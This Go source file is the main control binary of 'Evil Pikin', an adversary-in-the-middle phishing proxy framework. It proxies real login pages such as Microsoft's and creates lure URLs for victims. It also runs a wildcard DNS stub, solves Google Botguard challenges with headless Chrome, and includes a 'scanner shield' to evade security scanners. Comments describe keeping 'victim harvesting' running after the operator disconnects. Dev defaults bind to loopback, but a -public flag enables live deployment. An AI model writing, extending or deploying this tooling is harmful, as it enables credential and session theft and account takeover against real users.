// Command evilpikin is the unified control binary for the Evil Pikin AiTM
// framework. It boots the proxy engine as background goroutines and then
// exposes the interactive control shell either locally (tmux/stdin) or via an
// embedded SSH server. Disconnecting a terminal or SSH session never stops
// the engine.
package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"github.com/user/evilpikin/internal/console"
	"github.com/user/evilpikin/internal/control"
	"github.com/user/evilpikin/internal/dns"
	"github.com/user/evilpikin/internal/firewall"
	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/internal/proxy"
	"github.com/user/evilpikin/internal/puppet"
	"github.com/user/evilpikin/internal/storage"
	"github.com/user/evilpikin/internal/telemetry"
	"github.com/user/evilpikin/pkg/config"
	pxr "github.com/user/evilpikin/pkg/proxy"
	"github.com/user/evilpikin/pkg/tui"
)

// parseCSV splits a comma-separated flag value into a clean, lowered,
// whitespace-trimmed slice with empties dropped.
func parseCSV(s string) []string {
	var out []string
	for _, p := range strings.Split(s, ",") {
		if p = strings.ToLower(strings.TrimSpace(p)); p != "" {
			out = append(out, p)
		}
	}
	return out
}

// isLoopbackAddr reports whether addr binds only to the local machine. An empty
// host (":port") means "all interfaces" (0.0.0.0 / ::) and is NOT loopback.
func isLoopbackAddr(addr string) bool {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		host = addr // no port present; treat the whole string as the host
	}
	if host == "" {
		return false
	}
	if host == "localhost" {
		return true
	}
	ip := net.ParseIP(host)
	return ip != nil && ip.IsLoopback()
}

// dataDir returns the stable base directory for runtime state. For a built
// binary it is the executable's directory, so the DB / dev CA / SSH keys live
// next to it regardless of the launching cwd (this is what makes lures and
// sessions persist across restarts). Under `go run` the binary sits in a temp
// build dir, so we fall back to the current working directory to preserve the
// existing dev workflow (state under the repo-root .sandbox/).
func dataDir() string {
	if e, err := os.Executable(); err == nil {
		d := filepath.Dir(e)
		if !strings.Contains(d, "go-build") && !strings.HasPrefix(d, "/tmp") && !strings.Contains(d, "/Temp/") {
			return d
		}
	}
	if wd, err := os.Getwd(); err == nil {
		return wd
	}
	return "."
}

// resolvePath anchors a relative path to dataDir(); absolute paths pass through.
func resolvePath(p string) string {
	if p == "" || filepath.IsAbs(p) {
		return p
	}
	return filepath.Join(dataDir(), p)
}

func main() {
	mode := flag.String("mode", "local", "control interface mode: local | ssh")
	sshAddr := flag.String("ssh-addr", ":2222", "embedded ssh control listener (mode=ssh)")
	sshKeys := flag.String("ssh-keys", ".sandbox/certs/console_authorized_keys", "authorized_keys file for ssh mode")
	// Dev/sandbox default: STRICTLY loopback. The data plane never binds
	// 0.0.0.0 / a LAN address in dev mode — a victim (or scanner) on another
	// host must not be able to reach it. Deployment uses cmd/engine with
	// --public, or evilpikin -public, by explicit operator choice.
	httpAddr := flag.String("http", "127.0.0.1:9080", "data plane http listener (dev defaults to loopback)")
	httpsAddr := flag.String("https", "127.0.0.1:9443", "data plane https listener (dev defaults to loopback)")
	dbPath := flag.String("db", ".sandbox/evilpikin.db", "sqlite database path (isolated under .sandbox/)")
	targetsDir := flag.String("targets", "configs/targets", "target profiles directory")
	domain := flag.String("domain", "ms.test", "phishing base domain (cookie scoping + lure URLs)")
	apiAddr := flag.String("api-addr", "127.0.0.1:8080", "REST control API bind address (shares the same store+engine as the shell)")
	upstreamDNS := flag.String("upstream-dns", "1.1.1.1:53", "DNS resolver for REAL origin egress (out-of-band 1.1.1.1:53 avoids the /etc/resolver loop that captures the real origins; falls back to the system resolver automatically if 1.1.1.1 is blocked)")
	egressProxy := flag.String("egress-proxy", "", "optional upstream HTTP/HTTPS proxy for REAL origin egress (e.g. http://corp-proxy:3128). Required in labs that only permit internet egress through a corporate proxy; without it the CDN (azureedge.net CNAME) is unreachable while login.microsoftonline.com may still resolve")
	// Local DNS port for wildcard *.<domain> resolution. It must NOT be :53:
	// macOS mDNSResponder already owns 127.0.0.1:53. The DNS server writes
	// /etc/resolver/<domain> with this port, so macOS forwards the whole
	// subtree to it. Use a high port to avoid the conflict.
	dnsAddr := flag.String("dns", "127.0.0.1:5333", "local DNS listen address for wildcard *.<domain> resolution (avoids :53 which macOS mDNSResponder owns)")
	// public opts the instance out of the loopback guard. It is REQUIRED to bind
	// a non-loopback address; dev mode refuses otherwise. Only set this when you
	// are deliberately deploying on a controlled host.
	public := flag.Bool("public", false, "allow binding non-loopback addresses (deployment only; dev stays on 127.0.0.1)")
	noTUI := flag.Bool("no-tui", false, "run headless without the TUI cockpit (engine + data plane stay live; logs to stderr, safe to redirect to a file)")
	intercept := flag.String("intercept-domains", "", "comma-separated domain suffixes served by the proxy AND resolved to this host by the local DNS stub, e.g. \"google.test\". The base domain is always intercepted; this extends coverage to foreign suffixes (wildcard: every sub-host of a listed suffix is answered and proxied).")
	flag.Parse()

	// Stabilize runtime-state paths so persistence (lures, sessions, the dev CA)
	// does not depend on the directory the operator launches from. A built binary
	// anchors state next to itself; `go run` (temp build dir) falls back to the
	// current working directory.
	*dbPath = resolvePath(*dbPath)
	*sshKeys = resolvePath(*sshKeys)

	// When launched as root (sudo) WITHOUT -public and without explicit ports,
	// keep the dev high ports on loopback. Only a deliberate -public root launch
	// grabs the privileged :80/:443 for a clean https://<domain> deployment URL.
	explicitPorts := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "http" || f.Name == "https" {
			explicitPorts = true
		}
	})
	if !explicitPorts && os.Getuid() == 0 && *public {
		*httpAddr = ":80"
		*httpsAddr = ":443"
		log.Info("running as root with -public: binding standard ports http=:80 https=:443 (pass -http/-https to override)")
	}

	// Sandbox guard: in dev mode every listener must be loopback. Binding
	// 0.0.0.0 (or any non-loopback host) would expose the proxy to the LAN and
	// to scanners — refuse it unless -public was explicitly passed.
	if !*public {
		for _, a := range []string{*httpAddr, *httpsAddr, *apiAddr} {
			if !isLoopbackAddr(a) {
				log.Fatal("sandbox/dev mode refuses non-loopback bind %q (would expose on 0.0.0.0). "+
					"Bind 127.0.0.1/localhost, or pass -public ONLY for intentional deployment.", a)
			}
		}
		log.Info("sandbox mode: data plane bound strictly to loopback (127.0.0.1) — not exposed to the LAN")
	}

	// Ensure the isolated sandbox directory exists for the dev CA, DB, and keys.
	if err := os.MkdirAll(resolvePath(".sandbox/certs"), 0755); err != nil {
		log.Fatal("mkdir .sandbox/certs: %v", err)
	}

	// A dropped SSH session / operator logout delivers SIGHUP; do not let it kill
	// the capture engine. (screen/tmux already shield this; this also covers a
	// bare nohup-style launch so victim harvesting continues after disconnect.)
	signal.Ignore(syscall.SIGHUP)

	log.Info("state database: %s", *dbPath)
	store, err := storage.OpenSQLite(*dbPath)
	if err != nil {
		log.Fatal("storage: %v", err)
	}
	defer store.Close()

	// --- Background proxy engine (runs as independent goroutines) ----------
	engine := proxy.NewEngine()
	engine.SetStore(store)
	engine.SetGeoFence(firewall.NewGeoFence())
	hub := telemetry.NewHub()
	engine.SetTelemetry(hub)
	engine.SetSiteDomain(*domain)
	// Foreign-suffix intercepts (e.g. google.test): the engine serves these
	// hostnames, and the DNS stub below resolves them to this host.
	interceptList := parseCSV(*intercept)
	if len(interceptList) > 0 {
		engine.SetInterceptDomains(interceptList)
		log.Info("intercept domains (engine): %v", interceptList)
	}
	// EvilPuppet: headless-Chrome solver for client-side anti-automation
	// challenges (Google Botguard). Inert unless a target declares an
	// `evilpuppet` block; Chrome is only launched on demand, per challenge.
	engine.SetPuppet(puppet.NewChromeSolver(""))

	// Multi-tenant compound-index registry: live (host <-> token) attribution and
	// per-(target, token) hit counts for concurrent campaigns. The internal
	// engine keeps serving traffic with its own richer per-host routing; it
	// attaches this registry so the shared index stays populated across every
	// phishing host the instance serves.
	reg := pxr.NewRuntimeRegistry()
	engine.SetRuntimeRegistry(reg)

	proxy.SetUpstreamDNS(*upstreamDNS)
	if *egressProxy != "" {
		if err := proxy.SetUpstreamProxy(*egressProxy); err != nil {
			log.Fatal("invalid --egress-proxy %q: %v", *egressProxy, err)
		}
	}

	// Tell the rewrite engine which public TLS port to keep browsers on when
	// rewriting URLs/Location headers (dev uses :9443, not the standard 443).
	if _, port, err := net.SplitHostPort(*httpsAddr); err == nil && port != "" && port != "443" {
		if p, err := strconv.Atoi(port); err == nil {
			engine.TLSPort = p
		}
	}

	if err := storage.LoadTargetsFromDir(store, *targetsDir); err != nil {
		log.Error("seed targets: %v", err)
	}
	targets, err := store.ListTargets()
	if err != nil {
		log.Fatal("list targets: %v", err)
	}
	for _, t := range targets {
		if t.Enabled {
			engine.UpsertTarget(t)
		}
	}
	log.Info("loaded %d target profiles", len(targets))

	// Start the local DNS server so the victim browser can resolve the phishing
	// base domain AND every dynamically-generated <host>.<BaseDomain> alias
	// (e.g. aadcdn.msauth.net.ms.test) to 127.0.0.1. Without it, only hosts a
	// separate `cmd/engine -dns-only` pre-listed would resolve, so the CDN
	// bundles a real login page references fail with ERR_NAME_NOT_RESOLVED and
	// the page spins forever (the HTML loads but its scripts/stylesheets can't).
	// When launched as root it also writes /etc/resolver/<domain> so macOS routes
	// the whole subtree to this server.
	dnsSrv := dns.NewServer(*domain, *dnsAddr)
	if len(interceptList) > 0 {
		dnsSrv.SetInterceptDomains(interceptList)
	}
	go dnsSrv.Start()

	// Hydrate the registry's active-lure index from durable storage so the
	// compound index survives restarts (not only lures created live this run).
	if ls, err := store.ListLures(); err == nil {
		for _, l := range ls {
			if !l.IsActive {
				continue
			}
			reg.RegisterLure(&config.LureInstance{
				Token:       l.ID,
				TargetID:    l.TargetProfile,
				RedirectURL: l.RedirectURL,
				IsActive:    l.IsActive,
			})
		}
	}

	cfg := console.Config{
		ListenHTTP:  *httpAddr,
		ListenHTTPS: *httpsAddr,
		CACertPath:  resolvePath(".sandbox/certs/dev-ca.pem"),
		CAKeyPath:   resolvePath(".sandbox/certs/dev-ca.key"),
	}
	c, err := console.New(store, engine, cfg)
	if err != nil {
		log.Fatal("console: %v", err)
	}
	// REST control API shares the SAME store + engine as the shell, so both
	// interfaces drive one source of truth (targets/sessions). Target changes
	// from either path are reflected into the live engine via the callbacks.
	api := control.NewControlAPI(store)
	api.SetTelemetryHub(hub)
	api.SetWebDir("web")
	api.SetBindAddr(*apiAddr)
	api.OnTargetUpsert(func(t *storage.TargetProfile) {
		if t.Enabled {
			engine.UpsertTarget(t)
		} else {
			engine.RemoveTarget(t.ProxyHost)
		}
	})
	api.OnTargetDelete(func(id string) {
		if t, err := store.GetTarget(id); err == nil {
			engine.RemoveTarget(t.ProxyHost)
		}
	})

	api.SetLures(c.Lures, reg, *httpsAddr)
	go func() {
		if err := api.Start(); err != nil {
			// REST is secondary to the shell/engine: a bind conflict must not
			// take down the proxy engine or the operator's session.
			log.Error("control api: %v (REST interface disabled)", err)
		}
	}()

	// --- Control interface -------------------------------------------------
	switch *mode {
	case "ssh":
		keys, err := console.LoadAuthorizedKeys(*sshKeys)
		if err != nil {
			log.Fatal("load authorized keys (%s): %v", *sshKeys, err)
		}
		if len(keys) == 0 {
			log.Fatal("no authorized keys loaded from %s; refusing ssh start", *sshKeys)
		}
		go func() {
			if err := c.ServeSSH(*sshAddr, keys); err != nil {
				log.Fatal("ssh control plane: %v", err)
			}
		}()
		log.Info("evilpikin: engine + ssh control plane up; press Ctrl-C to stop the whole process")
		waitForSignal()
	default:
		// The data plane is intentionally NOT auto-started. The operator must run
		// `start` from the cockpit to bring the proxy online, so a captured lure
		// never begins serving until the operator explicitly authorizes it. The
		// listener stays dark until then.
		detached := false
		cfg := tui.Config{
			Store:            store,
			Version:          "1.0",
			BaseDomain:       *domain,
			InterceptDomains: engine.InterceptDomains,
			DashboardURL:     "http://" + *apiAddr + "/",
			ListenHTTP:       *httpAddr,
			ListenHTTPS:      *httpsAddr,
			OnStart: func() (string, error) {
				if c.IsRunning() {
					return "[*] data plane already running", nil
				}
				go c.StartDataPlane()
				return "[*] data plane starting...", nil
			},
			OnStop: func() string {
				if !c.IsRunning() {
					return "[*] data plane not running"
				}
				return c.StopDataPlane()
			},
			OnDetach: func() { detached = true },
			OnLureAdd: func(path, target, redirect string) (string, error) {
				t, err := store.GetTarget(target)
				if err != nil {
					return "", fmt.Errorf("target %q not found", target)
				}
				l, err := c.Lures.Create(path, t.ProxyHost, redirect)
				if err != nil {
					return "", err
				}
				reg.RegisterLure(&config.LureInstance{
					Token:       l.ID,
					TargetID:    t.ProxyHost,
					RedirectURL: redirect,
					IsActive:    true,
				})
				// Build the victim-facing URL from the target's PRIMARY proxy host
				// (the host the engine actually routes by — not the bare base domain,
				// which is not a registered route) plus the live HTTPS listen port.
				// In dev the listener is 127.0.0.1:9443 so the URL must carry :9443;
				// in a deployed -public instance it binds :443 and the port is
				// omitted. This keeps `lure add` usable in both modes as-is.
				host := t.ProxyHost
				if _, p, err := net.SplitHostPort(*httpsAddr); err == nil && p != "" && p != "443" {
					host = net.JoinHostPort(host, p)
				}
				url := l.TrackingURL(host, "")
				board := "http://" + *apiAddr + "/?target=" + t.ID
				return fmt.Sprintf("lure %s registered\n  tracking url : %s\n  dashboard   : %s", l.ID, url, board), nil
			},
			OnLureRemove: func(id string) error {
				c.Lures.Delete(id)
				reg.UnregisterLure(id)
				return nil
			},
			OnTargetToggle: func(id string, enabled bool) error {
				if err := store.SetTargetEnabled(id, enabled); err != nil {
					return err
				}
				if t, err := store.GetTarget(id); err == nil {
					if enabled {
						engine.UpsertTarget(t)
					} else {
						engine.RemoveTarget(t.ProxyHost)
					}
				}
				return nil
			},
			OnScannerShield: func(enabled bool) error {
				engine.SetScannerShield(enabled)
				return nil
			},
			OnScannerShieldStatus: func() (bool, []string) {
				return engine.ScannerShield, engine.ScannerCIDRs()
			},
			OnScannerCIDRAdd: func(cidr string) error {
				return engine.AddScannerCIDR(cidr)
			},
			OnScannerCIDRClear: func() error {
				engine.ClearScannerCIDRs()
				return nil
			},
		}
		log.Info("evilpikin: engine + TUI cockpit up; monitoring console at %s", cfg.DashboardURL)
		if *noTUI {
			go c.StartDataPlane()
			log.Info("evilpikin: running headless (--no-tui); data plane started, live until Ctrl-C")
			waitForSignal()
			c.StopDataPlane()
			return
		}
		if err := tui.Run(cfg); err != nil {
			// The pty was lost (e.g. operator logged out without screen): keep
			// the capture engine running in the background until a real stop.
			log.Error("cockpit: %v (engine continues in background until Ctrl-C)", err)
			waitForSignal()
			c.StopDataPlane()
			return
		}
		if detached {
			// Explicit `detach` from the cockpit: leave the engine live so it
			// keeps harvesting victims after the operator disconnects.
			log.Info("cockpit detached; engine continues in background until Ctrl-C")
			waitForSignal()
			c.StopDataPlane()
			return
		}
		// Explicit `exit`: tear the data plane down and leave.
		c.StopDataPlane()
	}
}

func waitForSignal() {
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
}
